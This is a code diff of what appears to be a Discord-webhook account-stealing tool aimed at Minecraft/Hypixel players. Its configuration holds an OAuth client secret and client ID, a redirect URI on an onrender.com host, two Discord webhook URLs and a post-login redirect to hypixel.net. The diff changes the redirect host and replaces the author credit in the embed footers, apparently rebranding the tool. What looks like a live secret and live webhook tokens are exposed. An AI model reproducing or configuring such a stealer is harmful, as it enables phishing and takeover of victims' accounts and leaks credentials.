@@ -1,7 +1,7 @@
 //Change these btw
 const client_secret = 'bxJ8Q~xFTDzsMvE.7fEPkOJBQwpZSzDV4O9bsdjo' //you need to put the "Secret Value" here not the "Secret ID"!!!!
 const client_id = 'e2fb820e-0cc5-4902-8866-dde3794f9e81'
-const redirect_uri = 'https://uzmicauth.onrender.com'
+const redirect_uri = 'https://ezauth.onrender.com/'
 const webhook_url = 'https://discord.com/api/webhooks/1051722653028859915/7zcycQvduZd3xNi2znvgPlt1Xbym3bdQsTfU-iji6mpZwkqzN3k2wOfEoK5tFHruhUH5'
 const webhook_log = 'https://discord.com/api/webhooks/1047627571493339257/TRpgQ_5yAgC8Mx800LRoJn6DIhmCDOSImYMloMBam_vBfzJaWhciAHxeg-fZvQjfgJ6v'
 const redirection = 'https://hypixel.net' //Redirects the user after they login and allow (e.g 'https://hypixel.net') LEAVE BLANK IF U DONT WANT IT TO REDIRECT OR SUM IDK
@@ -267,7 +267,7 @@ content: "@everyone ",
         
       ],
       "footer": {
-        "text": "By heda",
+        "text": "By Average",
         "icon_url": "https://cdn.discordapp.com/avatars/919624780112592947/a_119345db608773253c2c6d687ea25155.webp"
       }
     }
@@ -423,7 +423,7 @@ content: "@everyone ",
         
       ],
       "footer": {
-        "text": "By heda",
+        "text": "By Average",
         "icon_url": "https://cdn.discordapp.com/avatars/919624780112592947/a_119345db608773253c2c6d687ea25155.webp"
       }
     }
